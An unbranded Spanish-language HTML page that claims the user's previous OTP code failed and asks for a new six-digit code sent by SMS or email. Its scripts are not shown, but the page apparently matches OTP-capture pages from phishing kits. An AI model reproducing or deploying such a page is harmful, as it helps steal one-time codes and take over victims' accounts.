<!DOCTYPE html>
<html lang="es">
<head>    

    <link rel="shortcut icon" href="img/favicon.ico">
    <link rel="apple-touch-icon" href="img/favicon.png"> 
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style/login-pw.css">
    <title>Verificación de Código</title>
</head>
<body>
    <header class="header"></header>
    <br><center><img src="img/logo2.png" width="200" height="50"></center>
    <div class="steps-container">
        <h2>Enviar solicitud</h2>
        <div class="steps-indicator">
            <div class="step active"></div>
            <div class="step active"></div>
            <div class="step"></div>

        </div>
    </div>
    <div class="form-container">
        <h4>Error en tu código OTP anterior</h4>
        <h3>Ingresá el nuevo código OTP enviado mediante SMS o correo registrado</h3>
        <form id="verificationForm" method="post">
            <div class="input-wrapper">
                <input type="tel" id="verificationCode" maxlength="6" placeholder="Código OTP" oninput="allowOnlyNumbers(this)">
            </div>
            <div class="button-group">
                <button type="submit" class="continue-btn"enabled>Continuar</button>
            </div>
        </form>
    </div>
    <script src="js/login2.js"></script> 
    <script src="js/allowOnlyNumbers.js"></script> 

    <script src="js/main.js"></script> 
    <script src="js/script2.js"></script> 

</body>
</html>
